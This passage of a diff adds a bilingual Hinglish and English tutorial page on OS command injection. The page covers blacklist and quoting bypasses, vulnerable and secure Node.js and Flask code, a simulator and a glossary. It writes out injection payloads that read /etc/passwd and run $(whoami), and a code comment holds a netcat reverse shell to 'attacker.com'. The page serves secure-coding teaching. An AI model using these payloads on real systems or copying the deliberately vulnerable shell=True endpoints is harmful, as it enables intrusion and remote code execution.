+                <span class="lang-hi">Server ne user se socha tha "sirf ek IP address milega" — jaise office assistant se socha tha "sirf ek letter print karne ka instruction milega". Lekin jaise assistant ne comma dekhte hi doosra kaam bhi kar diya, waise hi shell ne <code>;</code> dekhte hi <code>cat /etc/passwd</code> (jo password file padhne ka command hai) ko bhi ek "alag, valid instruction" samajh kar chala diya.</span>
+                <span class="lang-en">The server expected "just an IP address" from the user — just like the office assistant expected "just a print instruction". But just as the assistant did the second task upon seeing a comma, the shell ran <code>cat /etc/passwd</code> (a command that reads the password file) as soon as it saw the <code>;</code>, treating it as a "separate, valid instruction".</span>
+            </p>
+          </div>
+
+          <p>
+            <span class="lang-hi"><code>&&</code>, <code>||</code>, <code>|</code>, backtick <code>` `</code>, aur <code>$()</code> command substitution — ye sab bhi isi tarah kaam karte hain. Attacker jo bhi shell command chahe, wo output application ke response mein wapas dikh sakta hai, ya server ke process ke saath hi execute ho sakta hai — matlab poora <strong>Remote Code Execution (RCE)</strong>.</span>
+            <span class="lang-en"><code>&&</code>, <code>||</code>, <code>|</code>, backtick <code>` `</code>, and <code>$()</code> command substitution all work the same way. Whatever shell command the attacker wants can run under the same process as the server — meaning full <strong>Remote Code Execution (RCE)</strong>.</span>
+          </p>
+
+          <a class="sim-jump" href="#simulator">🎮 <span class="lang-hi">Classic injection simulator mein dekho</span><span class="lang-en">See classic injection in the simulator</span></a>
+        </div>
+      </div>
+    </div>
+
+    <!-- LEVEL 2 -->
+    <div class="level-card" id="level-2" data-level="2">
+      <button class="level-header">
+        <span class="level-badge">2</span>
+        <span class="level-titles">
+          <h2>
+            <span class="lang-hi">Misconfiguration 2 — Incomplete Blacklist</span>
+            <span class="lang-en">Misconfiguration 2 — Incomplete Blacklist</span>
+          </h2>
+          <p>
+            <span class="lang-hi">Kuch characters block karna, poora attack surface nahi</span>
+            <span class="lang-en">Blocking some characters, not the whole attack surface</span>
+          </p>
+        </span>
+        <span class="level-tag problem"><span class="lang-hi">GAP</span><span class="lang-en">GAP</span></span>
+        <span class="chevron">▾</span>
+      </button>
+      <div class="level-body">
+        <div class="level-inner">
+          <h4>
+            <span class="lang-hi">BLACKLIST KA APPROACH</span>
+            <span class="lang-en">THE BLACKLIST APPROACH</span>
+          </h4>
+          <p>
+            <span class="lang-hi">Developer level-1 ka incident dekh kar reactive fix karta hai: "chalo <code>;</code>, <code>|</code>, aur <code>&</code> ko block kar dete hain":</span>
+            <span class="lang-en">The developer sees the level-1 incident and applies a reactive fix: "let's block <code>;</code>, <code>|</code>, and <code>&</code>":</span>
+          </p>
+          <pre><code>if any(c in user_input for c in [';', '|', '&']):
+    reject_request()</code></pre>
+          <p>
+            <span class="lang-hi">Ab pehle wala payload <code>8.8.8.8; cat /etc/passwd</code> reject ho jaata hai — developer confident feel karta hai ki vulnerability fix ho gayi.</span>
+            <span class="lang-en">Now the earlier payload <code>8.8.8.8; cat /etc/passwd</code> gets rejected — the developer feels confident the vulnerability is fixed.</span>
+          </p>
+
+          <div class="callout">
+            <span class="cal-label">
+                <span class="lang-hi">⚠️ GAP — BLACKLIST HAMESHA INCOMPLETE HOTI HAI</span>
+                <span class="lang-en">⚠️ GAP — A BLACKLIST IS ALWAYS INCOMPLETE</span>
+            </span>
+            <p>
+                <span class="lang-hi">Shell mein command separator sirf <code>;</code>, <code>|</code>, aur <code>&</code> nahi hain. Attacker <code>NEWLINE</code> character use karta hai, jo bhi command-separator ki tarah kaam karta hai, aur jo is chhoti si blacklist mein maujood nahi hai:</span>
+                <span class="lang-en">A shell's command separators aren't just <code>;</code>, <code>|</code>, and <code>&</code>. The attacker uses a <code>NEWLINE</code> character, which also works as a command separator, and which isn't present in this small blacklist:</span>
+            </p>
+            <pre><code>8.8.8.8
+cat /etc/passwd</code></pre>
+            <p>
+                <span class="lang-hi">Browser se ye value <code>8.8.8.8%0acat /etc/passwd</code> ki tarah URL-encoded bhejta hai. Server request ko decode karta hai, blacklist check karta hai (koi <code>;</code>/<code>|</code>/<code>&</code> nahi milta, PASS ho jaata hai), aur fir isi decoded string ko seedha shell mein pass kar deta hai — jahan newline apna kaam kar deta hai.</span>
+                <span class="lang-en">From the browser this value is sent URL-encoded as <code>8.8.8.8%0acat /etc/passwd</code>. The server decodes the request, checks the blacklist (finds no <code>;</code>/<code>|</code>/<code>&</code>, PASSES), and then passes this same decoded string straight into the shell — where the newline does its job.</span>
+            </p>
+          </div>
+
+          <p>
+            <span class="lang-hi">Backticks <code>` `</code> aur <code>$()</code> command substitution bhi isi blacklist se bahar hain — matlab attacker <code>8.8.8.8; $(whoami)</code> jaisi cheezein use kar sakta hai agar sirf inhi 3 characters ko block kiya gaya ho. GAP ye hai ki blacklisting mein developer ko HAR POSSIBLE dangerous character yaad rakhna padta hai — aur shell metacharacters ki list itni badi hai (aur OS-specific bhi) ki kuch na kuch chhoot hi jaata hai.</span>
+            <span class="lang-en">Backticks <code>` `</code> and <code>$()</code> command substitution are also outside this blacklist — meaning the attacker can use things like <code>8.8.8.8; $(whoami)</code> if only those 3 characters are blocked. The GAP is that blacklisting requires the developer to remember EVERY POSSIBLE dangerous character — and the list of shell metacharacters is large (and OS-specific) enough that something always slips through.</span>
+          </p>
+
+          <a class="sim-jump" href="#simulator">🎮 <span class="lang-hi">Blacklist bypass simulator mein dekho</span><span class="lang-en">See blacklist bypass in the simulator</span></a>
+        </div>
+      </div>
+    </div>
+
+    <!-- LEVEL 3 -->
+    <div class="level-card" id="level-3" data-level="3">
+      <button class="level-header">
+        <span class="level-badge">3</span>
+        <span class="level-titles">
+          <h2>
+            <span class="lang-hi">Misconfiguration 3 — Naive Quoting Aur Blind Injection</span>
+            <span class="lang-en">Misconfiguration 3 — Naive Quoting And Blind Injection</span>
+          </h2>
+          <p>
+            <span class="lang-hi">Quotes lagana kaafi nahi, aur output na dikhna bhi safe nahi</span>
+            <span class="lang-en">Quoting isn't enough, and no visible output isn't safe either</span>
+          </p>
+        </span>
+        <span class="level-tag problem"><span class="lang-hi">GAP</span><span class="lang-en">GAP</span></span>
+        <span class="chevron">▾</span>
+      </button>
+      <div class="level-body">
+        <div class="level-inner">
+          <h4>
+            <span class="lang-hi">NAIVE QUOTING KI GALTI</span>
+            <span class="lang-en">THE FLAW OF NAIVE QUOTING</span>
+          </h4>
+          <p>
+            <span class="lang-hi">Developer ab aur smart hone ki koshish karta hai: blacklist ke bajaye, wo input ko double-quotes mein WRAP kar deta hai, sochte hue ki quotes ke andar metacharacters apna special meaning kho dete hain:</span>
+            <span class="lang-en">The developer now tries to be smarter: instead of a blacklist, they WRAP the input in double-quotes, thinking that metacharacters lose their special meaning inside quotes:</span>
+          </p>
+          <pre><code>os.system('ping -c 4 "' + user_input + '"')</code></pre>
+          <p>
+            <span class="lang-hi">Ye partially kaam karta hai: POSIX shell mein double-quotes ke andar <code>;</code>, <code>|</code>, <code>&</code>, aur spaces apna special meaning kho dete hain, isliye pehla payload <code>8.8.8.8; cat /etc/passwd</code> ab literal string ban jaata hai aur harmless hai.</span>
+            <span class="lang-en">This partially works: inside double-quotes in a POSIX shell, <code>;</code>, <code>|</code>, <code>&</code>, and spaces lose their special meaning, so the earlier payload <code>8.8.8.8; cat /etc/passwd</code> now becomes a literal string and is harmless.</span>
+          </p>
+
+          <div class="callout">
+            <span class="cal-label">
+                <span class="lang-hi">⚠️ GAP</span>
+                <span class="lang-en">⚠️ GAP</span>
+            </span>
+            <p>
+                <span class="lang-hi">Lekin POSIX shell rules ke mutaabik, DOUBLE-QUOTES ke andar bhi <strong>$ (variable expansion)</strong>, <strong>backtick command substitution</strong>, aur <strong>$() command substitution</strong> apna special meaning NAHI khote. Attacker ye payload bhejta hai:</span>
+                <span class="lang-en">However, per POSIX shell rules, even INSIDE DOUBLE-QUOTES, <strong>$ (variable expansion)</strong>, <strong>backtick command substitution</strong>, and <strong>$() command substitution</strong> do NOT lose their special meaning. The attacker sends this payload:</span>
+            </p>
+            <pre><code>8.8.8.8$(whoami)</code></pre>
+            <p>
+                <span class="lang-hi">Final command ban jaati hai <code>ping -c 4 "8.8.8.8$(whoami)"</code>. Shell quotes ke andar bhi <code>$(whoami)</code> ko execute karta hai, uska output substitute karta hai, aur fir poori string ko ek hi argument ki tarah ping ko pass karta hai — attacker ka command chal chuka hota hai, chahe ping fail ho jaaye.</span>
+                <span class="lang-en">The final command becomes <code>ping -c 4 "8.8.8.8$(whoami)"</code>. The shell executes <code>$(whoami)</code> even inside the quotes, substitutes its output, and then passes the whole string as a single argument to ping — the attacker's command has already executed, even if ping itself fails.</span>
+            </p>
+          </div>
+
+          <h4>
+            <span class="lang-hi">BLIND COMMAND INJECTION</span>
+            <span class="lang-en">BLIND COMMAND INJECTION</span>
+          </h4>
+          <p>
+            <span class="lang-hi"><code>Blind Command Injection</code> tab hoti hai jab injected command ka output kahin response mein direct dikhta nahi — application sirf "Success"/"Failed" jaisa generic message dikhata hai. Is case mein tester <code>time-based</code> technique use karta hai: payload mein <code>sleep 10</code> jaisa command daalta hai, aur agar response aane mein genuinely <code>10 second</code> extra lagta hai, to isse confirm ho jaata hai ki command execute hui, chahe output kahin dikh na raha ho. Isi tarah <code>Out-of-Band (OAST)</code> technique mein attacker apne payload ke andar ek aisi command daalta hai jo target server se <code>attacker ke control kiye hue domain</code> ko DNS ya HTTP request bhejwaye *(jaise <code>Burp Collaborator</code> ya <code>interactsh</code> jaisa tool)*, aur agar wo request receive ho jaaye, to confirm ho jaata hai ki injection kaam kar rahi hai.</span>
+            <span class="lang-en">A <code>Blind Command Injection</code> occurs when the output of the injected command is not directly visible in the response — the application only shows a generic "Success"/"Failed" message. In this case, the tester uses a <code>time-based</code> technique: they insert a command like <code>sleep 10</code> in the payload, and if the response genuinely takes an extra <code>10 seconds</code> to arrive, it confirms the command executed, even if the output is not visible anywhere. Similarly, in the <code>Out-of-Band (OAST)</code> technique, the attacker inserts a command inside their payload that makes the target server send a DNS or HTTP request to an <code>attacker-controlled domain</code> *(using a tool like <code>Burp Collaborator</code> or <code>interactsh</code>)*, and if that request is received, it confirms the injection is working.</span>
+          </p>
+
+          <a class="sim-jump" href="#simulator">🎮 <span class="lang-hi">Quoting bypass simulator mein dekho</span><span class="lang-en">See quoting bypass in the simulator</span></a>
+        </div>
+      </div>
+    </div>
+
+    <!-- LEVEL 4 -->
+    <div class="level-card" id="level-4" data-level="4">
+      <button class="level-header">
+        <span class="level-badge">4</span>
+        <span class="level-titles">
+          <h2>
+            <span class="lang-hi">Final Solution — No-Shell Execution + Allowlist</span>
+            <span class="lang-en">Final Solution — No-Shell Execution + Allowlist</span>
+          </h2>
+          <p>
+            <span class="lang-hi">Shell ko avoid karo, format ko strictly validate karo</span>
+            <span class="lang-en">Avoid the shell entirely, strictly validate the format</span>
+          </p>
+        </span>
+        <span class="level-tag solved"><span class="lang-hi">SOLVED</span><span class="lang-en">SOLVED</span></span>
+        <span class="chevron">▾</span>
+      </button>
+      <div class="level-body">
+        <div class="level-inner">
+          <h4>
+            <span class="lang-hi">SAHI IMPLEMENTATION — SHELL SE BAHAR NIKALO</span>
+            <span class="lang-en">CORRECT IMPLEMENTATION — GET OUT OF THE SHELL</span>
+          </h4>
+          <p>
+            <span class="lang-hi">Asli, structural fix: shell ko poori tarah AVOID karo. Command ko ek STRING banane ke bajaye, ek ARRAY of arguments ki tarah OS process directly spawn karo — bina kisi shell interpreter ke beech mein:</span>
+            <span class="lang-en">The real, structural fix: AVOID the shell entirely. Instead of building the command as a STRING, spawn the OS process directly as an ARRAY of arguments — with no shell interpreter sitting in between:</span>
+          </p>
+          <pre><code>import subprocess
+subprocess.run(["ping", "-c", "4", user_input], shell=False)</code></pre>
+          <p>
+            <span class="lang-hi">Yahan <code>user_input</code> chahe kuch bhi ho — <code>"8.8.8.8; cat /etc/passwd"</code> — wo ek SINGLE, LITERAL argument ki tarah <code>ping</code> program ko diya jaata hai. Shell hai hi nahi is flow mein, isliye <code>;</code>, <code>|</code>, <code>$()</code>, backtick — koi bhi metacharacter apna special meaning KABHI expand nahi karega. Ping bas fail ho jaayega "invalid hostname" ke saath, koi command execute nahi hoga.</span>
+            <span class="lang-en">Here, whatever <code>user_input</code> is — even <code>"8.8.8.8; cat /etc/passwd"</code> — it is passed to the <code>ping</code> program as a SINGLE, LITERAL argument. There is no shell in this flow at all, so <code>;</code>, <code>|</code>, <code>$()</code>, backticks — no metacharacter will EVER expand its special meaning. Ping will simply fail with "invalid hostname", no command will execute.</span>
+          </p>
+
+          <h4>
+            <span class="lang-hi">DOOSRI LAYER — STRICT ALLOWLIST VALIDATION</span>
+            <span class="lang-en">SECOND LAYER — STRICT ALLOWLIST VALIDATION</span>
+          </h4>
+          <p>
+            <span class="lang-hi">Defense-in-depth ke liye, no-shell execution ke saath-saath input ko EXPECTED FORMAT ke against strictly validate bhi karo — sirf wahi characters allow karo jo genuinely zaroori hain (e.g. ek IP ke liye sirf digits aur dots):</span>
+            <span class="lang-en">For defense-in-depth, alongside no-shell execution, also strictly validate the input against the EXPECTED FORMAT — allow only those characters that are genuinely needed (e.g. for an IP, only digits and dots):</span>
+          </p>
+          <pre><code>import re
+if not re.fullmatch(r'^(\d{1,3}\.){3}\d{1,3}$', user_input):
+    reject_request()</code></pre>
+          <p>
+            <span class="lang-hi">Ye ALLOWLIST approach hai, blacklist se ulta — hum sirf UNHI patterns ko accept karte hain jo hum EXPECT karte hain, baaki SAB kuch reject. Ye developer ko "kaunsa character dangerous hai" yaad rakhne ki zimmedari se aazad kar deta hai — bas "valid IP kaisi dikhti hai" yaad rakhna hota hai.</span>
+            <span class="lang-en">This is an ALLOWLIST approach, the reverse of blacklisting — we only accept the patterns we EXPECT, and reject EVERYTHING else. This frees the developer from the burden of remembering "which character is dangerous" — they only need to remember "what does a valid IP look like".</span>
+          </p>
+
+          <div class="callout fixnote">
+            <span class="cal-label">
+                <span class="lang-hi">✅ AGAR SHELL AVOID NAHI KAR SAKTE</span>
+                <span class="lang-en">✅ IF YOU CANNOT AVOID THE SHELL</span>
+            </span>
+            <p>
+                <span class="lang-hi">Agar kisi legacy reason se shell hi use karna zaroori ho, to manual quoting kabhi mat karo — language ki built-in, battle-tested escaping library use karo (jaise Python ka <code>shlex.quote()</code>), jo har dangerous character ko sahi tarah se escape karta hai. Lekin ye hamesha ek FALLBACK hai — <strong>no-shell execution + allowlist</strong> hi primary, robust solution hai.</span>
+                <span class="lang-en">If, for some legacy reason, the shell must be used, never do manual quoting — use the language's built-in, battle-tested escaping library (like Python's <code>shlex.quote()</code>), which correctly escapes every dangerous character. But this is always a FALLBACK — <strong>no-shell execution + allowlisting</strong> remains the primary, robust solution.</span>
+            </p>
+          </div>
+
+          <a class="sim-jump" href="#simulator">🎮 <span class="lang-hi">Final fix simulator mein dekho</span><span class="lang-en">See the final fix in the simulator</span></a>
+        </div>
+      </div>
+    </div>
+
+  </section>
+
+  <!-- ── VULNERABLE VS SECURE CODE IMPLEMENTATIONS ── -->
+  <section class="sec-head" id="code-fixes">
+    <div class="sec-eyebrow"><span class="lang-hi">Code Level Fixes</span><span class="lang-en">Code Level Fixes</span></div>
+    <h2><span class="lang-hi">Code Level Fixes: Vulnerable vs. Secure Code Implementations</span><span class="lang-en">Code Level Fixes: Vulnerable vs. Secure Code Implementations</span></h2>
+    <p style="max-width: 100%; text-align: justify;">
+      <span class="lang-hi">OS Command Injection ko rokne ke liye user input par basic regex ya character blacklisting (jaise <code>;</code>, <code>|</code>, <code>&amp;</code>) lagana hamesha fail ho jata hai kyunki attackers newline characters (<code>\n</code>), command substitution (<code>$()</code>, <code>``</code>), environment variables, aur shell encodings ke zariye filters ko bypass kar lete hain. Sabse secure aur recommended tareeka hai shell execution ko completely bypass karna aur arguments ko as an array/list pass karna (jaise Node.js mein <code>execFile</code> / <code>spawn</code> aur Python mein <code>subprocess.run(..., shell=False)</code>), jisse shell interpreter kabhi spawn hi na ho. Niche Node.js aur Python (Flask) ke real-world vulnerable code aur unke production-grade secure implementations diye gaye hain:</span>
+      <span class="lang-en">Preventing OS Command Injection by relying on character blacklists (like <code>;</code>, <code>|</code>, <code>&amp;</code>) or naive sanitization consistently fails because attackers easily bypass filters using newline characters (<code>\n</code>), command substitution (<code>$()</code>, <code>``</code>), environment variables, and shell encodings. The industry gold standard defense is avoiding system shell interpreters altogether by using parameterized process execution (such as Node.js <code>execFile</code> / <code>spawn</code> and Python <code>subprocess.run(..., shell=False)</code>) where arguments are passed as discrete array elements. Below are vulnerable vs. production-grade secure implementations across Node.js and Python (Flask):</span>
+    </p>
+  </section>
+
+  <!-- NODE.JS CODE FIX DROPDOWN -->
+  <div class="level-card open" style="margin-bottom: 16px;">
+    <button class="level-header" type="button">
+      <span class="level-badge" style="background:rgba(104, 160, 99, 0.15); color:#68a063; border-color:#68a063;">JS</span>
+      <span class="level-titles">
+        <h2>
+          <span class="lang-hi">1. Node.js (child_process.exec vs. execFile &amp; spawn)</span>
+          <span class="lang-en">1. Node.js (child_process.exec vs. execFile &amp; spawn)</span>
+        </h2>
+        <p>
+          <span class="lang-hi">Shell execution bypass karna aur arguments ko immutable array ke roop mein pass karna</span>
+          <span class="lang-en">Bypassing shell invocation and passing arguments as an immutable array</span>
+        </p>
+      </span>
+      <span class="level-tag solved"><span class="lang-hi">SECURE PATTERN</span><span class="lang-en">SECURE PATTERN</span></span>
+      <span class="chevron">▾</span>
+    </button>
+    <div class="level-body">
+      <div class="level-inner">
+        <pre><code>// ==========================================
+// 1. Node.js (Express / child_process)
+// ==========================================
+
+const express = require('express');
+const { exec, execFile, spawn } = require('child_process');
+const net = require('net');
+const app = express();
+
+app.use(express.json());
+
+// ❌ INSECURE: Using child_process.exec with string concatenation
+// exec() spawns a shell (/bin/sh on Unix, cmd.exe on Windows).
+// Untrusted user input concatenated directly into the shell string allows command chaining.
+app.post('/api/network-ping', (req, res) =&gt; {
+    const host = req.body.host;
+
+    // DANGER: An attacker sends: "8.8.8.8; cat /etc/passwd" or "8.8.8.8 &amp;&amp; id"
+    // Shell executes `ping -c 4 8.8.8.8` followed by `cat /etc/passwd`!
+    exec(`ping -c 4 ${host}`, (error, stdout, stderr) =&gt; {
+        if (error) {
+            return res.status(500).json({ error: stderr || error.message });
+        }
+        return res.json({ output: stdout });
+    });
+});
+
+// ✅ SECURE Pattern 1: child_process.execFile with Argument Array (Recommended)
+// execFile() invokes the executable directly WITHOUT invoking a system shell (/bin/sh).
+// Arguments are passed as an array; metacharacters (; | &amp;&amp;) are treated as literal strings.
+app.post('/api/network-ping-secure', (req, res) =&gt; {
+    const host = req.body.host;
+
+    // 1. Strict Input Validation (Defense-in-Depth)
+    // Validate that the input is strictly an IPv4 or IPv6 address
+    if (!host || (!net.isIPv4(host) &amp;&amp; !net.isIPv6(host))) {
+        return res.status(400).json({ error: 'Invalid IP address format. Only valid IPs are allowed.' });
+    }
+
+    // 2. Safe Process Execution without Shell
+    // The OS treats 'host' strictly as a command-line parameter, NOT shell commands
+    execFile('ping', ['-c', '4', host], { timeout: 5000 }, (error, stdout, stderr) =&gt; {
+        if (error) {
+            return res.status(500).json({ error: 'Ping failed or host unreachable' });
+        }
+        return res.json({ output: stdout });
+    });
+});
+
+// ✅ SECURE Pattern 2: child_process.spawn with Streaming Output &amp; No Shell
+// spawn() is ideal for long-running processes or large output buffers.
+// Never pass { shell: true } to prevent command injection!
+app.post('/api/dns-lookup-secure', (req, res) =&gt; {
+    const domain = req.body.domain;
+
+    // Strict validation: domain name regex allowlist (RFC 1123 compliant)
+    const domainRegex = /^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
+    if (!domain || !domainRegex.test(domain)) {
+        return res.status(400).json({ error: 'Invalid domain name format.' });
+    }
+
+    // Direct invocation without spawning a shell:
+    const lookup = spawn('nslookup', [domain]);
+    let output = '';
+
+    lookup.stdout.on('data', (data) =&gt; {
+        output += data.toString();
+    });
+
+    lookup.on('close', (code) =&gt; {
+        if (code !== 0) {
+            return res.status(500).json({ error: 'Lookup command failed' });
+        }
+        return res.json({ output });
+    });
+});</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- PYTHON FLASK CODE FIX DROPDOWN -->
+  <div class="level-card open" style="margin-bottom: 24px;">
+    <button class="level-header" type="button">
+      <span class="level-badge" style="background:rgba(53, 114, 165, 0.15); color:#3572A5; border-color:#3572A5;">PY</span>
+      <span class="level-titles">
+        <h2>
+          <span class="lang-hi">2. Python / Flask (os.system vs. subprocess.run &amp; shlex.quote)</span>
+          <span class="lang-en">2. Python / Flask (os.system vs. subprocess.run &amp; shlex.quote)</span>
+        </h2>
+        <p>
+          <span class="lang-hi">shell=False parameterization aur ipaddress module ke saath strict type validation</span>
+          <span class="lang-en">shell=False parameterization and strict type validation using ipaddress module</span>
+        </p>
+      </span>
+      <span class="level-tag solved"><span class="lang-hi">SECURE PATTERN</span><span class="lang-en">SECURE PATTERN</span></span>
+      <span class="chevron">▾</span>
+    </button>
+    <div class="level-body">
+      <div class="level-inner">
+        <pre><code># ==========================================
+# 2. Python / Flask (subprocess &amp; shlex)
+# ==========================================
+
+from flask import Flask, request, jsonify
+import subprocess
+import ipaddress
+import shlex
+import os
+
+app = Flask(__name__)
+
+# ❌ INSECURE: Using os.system or subprocess with shell=True and string formatting
+@app.route('/api/ping', methods=['POST'])
+def ping_insecure():
+    target = request.json.get('target', '')
+
+    # VULNERABILITY 1: os.system invokes the underlying shell
+    # Payload: "8.8.8.8; cat /etc/passwd" or "8.8.8.8 | nc attacker.com 4444 -e /bin/sh"
+    # os.system(f"ping -c 4 {target}")
+
+    # VULNERABILITY 2: subprocess with shell=True interprets all shell metacharacters
+    try:
+        cmd = f"ping -c 4 {target}"
+        output = subprocess.check_output(cmd, shell=True, text=True, timeout=5)
+        return jsonify({"output": output})
+    except subprocess.CalledProcessError as e:
+        return jsonify({"error": str(e)}), 500
+
+
+# ✅ SECURE Pattern 1: subprocess.run with shell=False (Recommended Standard)
+@app.route('/api/ping-secure', methods=['POST'])
+def ping_secure():
+    target = request.json.get('target', '')
+
+    # 1. Strict Input Validation (Defense-in-Depth using standard library)
+    try:
+        # Validate that the input is genuinely a valid IP address
+        ipaddress.ip_address(target)
+    except ValueError:
+        return jsonify({"error": "Invalid IP address format. Only valid IPv4/IPv6 permitted."}), 400
+
+    # 2. Safe Process Execution without Shell Interpreter
+    # Passing arguments as a list with shell=False prevents any shell parsing.
+    # Even if metacharacters (; | &amp;&amp;) were somehow present, the OS passes them literally to 'ping'.
+    try:
+        result = subprocess.run(
+            ["ping", "-c", "4", target],
+            shell=False,               # CRITICAL: Do NOT spawn a shell
+            capture_output=True,
+            text=True,
+            timeout=5,
+            check=True
+        )
+        return jsonify({"output": result.stdout})
+    except subprocess.CalledProcessError as e:
+        return jsonify({"error": "Ping failed to reach host", "details": e.stderr}), 500
+    except subprocess.TimeoutExpired:
+        return jsonify({"error": "Ping request timed out"}), 504
+
+
+# ✅ SECURE Pattern 2: Legacy Fallback Using shlex.quote (When shell is unavoidable)
+@app.route('/api/legacy-tool', methods=['POST'])
+def legacy_tool():
+    filename = request.json.get('filename', '')
+
+    # If an existing legacy script mandates shell pipes or shell features:
+    # NEVER do manual string concatenation! Use shlex.quote to safely wrap arguments.
+    # Note: Whitelisting/No-shell execution is always preferred over escaping.
+    safe_filename = shlex.quote(filename)
+    safe_cmd = f"/usr/bin/wc -l {safe_filename}"
+
+    try:
+        output = subprocess.check_output(safe_cmd, shell=True, text=True, timeout=3)
+        return jsonify({"lines": output.strip()})
+    except Exception as e:
+        return jsonify({"error": "Failed to process file"}), 500</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- SIMULATOR -->
+  <section class="simulator-section" id="simulator">
+    <div class="sim-header-bar">
+      <div class="sim-title"><span>[🔴]</span> VAPT_SHELL_INTERCEPTOR</div>
+
+      <div class="sim-controls">
+        <div class="sim-control-group">
+          <label><span class="lang-hi">Attacker Payload</span><span class="lang-en">Attacker Payload</span></label>
+          <div class="sim-btn-group" id="opt-origin">
+            <button class="sim-btn active" data-val="semicolon">; cat /etc/passwd</button>
+            <button class="sim-btn" data-val="bypass">%0a$(whoami) encoded</button>
+          </div>
+        </div>
+
+        <div class="sim-control-group" style="margin-top: 10px;">
+          <label><span class="lang-hi">Backend Defense</span><span class="lang-en">Backend Defense</span></label>
+          <div class="sim-btn-group" id="opt-defense">
+            <button class="sim-btn active" data-val="0">0: No Filtering</button>
+            <button class="sim-btn" data-val="1">1: Basic Blacklist</button>
+            <button class="sim-btn" data-val="2">2: Pre-decode Blacklist</button>
+            <button class="sim-btn" data-val="3">3: Naive Quoting</button>
+            <button class="sim-btn" data-val="4">4: No-Shell + Allowlist</button>
+          </div>
+        </div>
+
+        <button class="btn-execute" id="btn-execute" style="margin-top: 15px;">Launch_Attack</button>
+      </div>
+    </div>
+
+    <div class="workspace">
+      <!-- Panel 1: Client -->
+      <div class="sim-panel" id="panel-browser">
+        <div class="sim-panel-header">🌐 Client_HTTP_Request</div>
+        <div class="sim-panel-body" id="log-browser">
+            <div style="margin-bottom:10px;"><span class="c-info">Payload:</span> <br> <code class="inline-code" id="lbl-payload">8.8.8.8; cat /etc/passwd</code></div>
+            <div><span class="c-info">Current Defense:</span> <br> <span class="c-warn" id="lbl-defense">0: No Filtering</span></div>
+        </div>
+      </div>
+
+      <!-- Panel 2: App Logic -->
+      <div class="sim-panel" id="panel-network">
+        <div class="sim-panel-header">⚙️ Application_Logic</div>
+        <div class="sim-panel-body" id="log-network"></div>
+      </div>
+
+      <!-- Panel 3: Shell -->
+      <div class="sim-panel" id="panel-server">
+        <div class="sim-panel-header">💻 OS_Shell_Execution</div>
+        <div class="sim-panel-body" id="log-server"></div>
+      </div>
+    </div>
+
+    <div id="sim-verdict-box" class="sim-verdict-box">
+      <div id="sim-verdict-title" class="sim-verdict-title"></div>
+      <div id="sim-verdict-text" class="sim-verdict-text"></div>
+    </div>
+  </section>
+
+  <!-- GLOSSARY -->
+  <section class="faq-section" id="glossary">
+    <div class="faq-header">
+      <h2>📖 <span class="lang-hi">Glossary</span><span class="lang-en">Glossary</span></h2>
+    </div>
+
+    <div class="faq-list">
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">01</span> Shell (OS Shell)</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek program (jaise <code>bash</code> ya <code>sh</code>) jo text-based commands ko padhta hai aur unhe operating system par execute karta hai. Jab bhi tum terminal mein kuch type karte ho, wahi shell usse samajh kar chalata hai.</span>
+          <span class="lang-en">A program (like <code>bash</code> or <code>sh</code>) that reads text-based commands and executes them on the operating system. Whenever you type something in a terminal, it's the shell that understands and runs it.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">02</span> Metacharacter</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek special character (jaise <code>;</code>, <code>|</code>, <code>&</code>, <code>$</code>, <code>` `</code>) jise shell literal text nahi, balki ek INSTRUCTION ki tarah treat karta hai — jaise "yahan ek command khatam, agli shuru".</span>
+          <span class="lang-en">A special character (like <code>;</code>, <code>|</code>, <code>&</code>, <code>$</code>, <code>` `</code>) that the shell treats not as literal text, but as an INSTRUCTION — meaning "one command ends here, the next one begins".</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">03</span> RCE (Remote Code Execution)</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek vulnerability jisme attacker internet ke kisi bhi jagah se, target server par apni marzi ka koi bhi command ya code chala sakta hai — security ki sabse critical category mein aata hai.</span>
+          <span class="lang-en">A vulnerability where an attacker, from anywhere on the internet, can run any command or code of their choosing on the target server — it falls into the most critical category of security issues.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">04</span> Payload</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Wo actual malicious input jo attacker kisi vulnerability ko test/exploit karne ke liye application ko bhejta hai — jaise <code>; cat /etc/passwd</code>.</span>
+          <span class="lang-en">The actual malicious input an attacker sends to an application to test or exploit a vulnerability — like <code>; cat /etc/passwd</code>.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">05</span> Command Substitution</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Backtick <code>` `</code> ya <code>$()</code> syntax — shell ko bolta hai "andar likhi command pehle chalao, uska OUTPUT yahan is jagah insert kar do".</span>
+          <span class="lang-en">The backtick <code>` `</code> or <code>$()</code> syntax — tells the shell "run the command written inside first, and insert its OUTPUT right here".</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">06</span> Blind Injection</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Jab vulnerability exist karti hai lekin injected command ka output response mein kahin dikhta nahi — tester ko time-delay ya external callback jaisi indirect techniques se confirm karna padta hai.</span>
+          <span class="lang-en">When a vulnerability exists but the injected command's output isn't visible anywhere in the response — the tester has to confirm it using indirect techniques like a time-delay or an external callback.</span>
+        </div>
+      </div>
+
+      <div class="glossary-item">
+        <div class="glossary-term"><span class="glossary-badge">07</span> OAST (Out-of-Band Testing)</div>
+        <div class="glossary-def">
+          <span class="lang-hi">Ek technique jisme target server ko attacker ke apne control kiye hue domain par DNS/HTTP request bhejne ke liye majboor kiya jaata hai — agar wo request receive ho jaaye, to isse pata chal jaata hai ki injection kaam kar rahi hai, chahe HTTP response mein kuch na dikhe.</span>
